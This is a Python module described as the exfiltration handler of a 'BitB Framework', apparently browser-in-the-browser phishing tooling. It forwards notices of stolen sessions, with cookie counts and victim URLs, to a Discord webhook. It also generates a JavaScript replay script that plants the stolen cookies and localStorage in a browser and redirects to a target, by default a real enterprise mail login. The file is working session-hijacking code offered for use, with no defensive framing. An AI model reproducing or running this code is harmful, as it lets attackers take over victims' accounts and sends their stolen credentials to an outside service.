#!/usr/bin/env python3
"""
Exfiltration Handler - Processes and forwards exfiltrated data
"""

import json
import asyncio
from datetime import datetime
from typing import Dict, Optional

import aiohttp


class ExfilHandler:
    def __init__(self, discord_webhook: Optional[str] = None):
        self.discord_webhook = discord_webhook

    def send_to_discord(self, session_id: str, data: Dict):
        if not self.discord_webhook:
            return
        embed = {
            'title': '🔴 BitB Session Exfiltrated',
            'color': 0xff0000,
            'timestamp': datetime.now().isoformat(),
            'fields': [
                {'name': 'Session ID', 'value': session_id, 'inline': True},
                {'name': 'Cookies', 'value': str(len(data.get('cookies', []))), 'inline': True},
                {'name': 'URLs', 'value': '\n'.join(data.get('urls', [])[:5]) or 'N/A', 'inline': False}
            ],
            'footer': {'text': 'BitB Framework'}
        }
        payload = {'embeds': [embed], 'content': f'New session exfiltrated: `{session_id}`'}
        asyncio.create_task(self._post_discord(payload))

    async def _post_discord(self, payload: Dict):
        async with aiohttp.ClientSession() as session:
            async with session.post(self.discord_webhook, json=payload, headers={'Content-Type': 'application/json'}) as resp:
                if resp.status != 204:
                    print(f'Discord webhook failed: {resp.status}')

    def format_for_replay(self, data: Dict) -> str:
        cookies = data.get('cookies', [])
        script_lines = [
            '// BitB Replay Script',
            f'// Generated: {datetime.now().isoformat()}',
            '',
            '// Set cookies'
        ]
        for cookie in cookies:
            cookie_str = f"{cookie['name']}={cookie['value']}; domain={cookie['domain']}; path={cookie['path']}"
            if cookie.get('secure'):
                cookie_str += '; Secure'
            if cookie.get('httpOnly'):
                cookie_str += '; HttpOnly'
            if cookie.get('sameSite'):
                cookie_str += f"; SameSite={cookie['sameSite']}"
            script_lines.append(f"document.cookie = '{cookie_str}';")
        script_lines.extend([
            '',
            '// Restore localStorage',
            'const localStorageData = ' + json.dumps(data.get('localStorage', {}), indent=2) + ';',
            'Object.entries(localStorageData).forEach(([key, value]) => {',
            '  localStorage.setItem(key, value);',
            '});',
            '',
            '// Redirect to target',
            f"window.location.href = '{data.get('urls', ['https://qiye.aliyun.com'])[0]}';"
        ])
        return '\n'.join(script_lines)

    async def close(self):
        pass
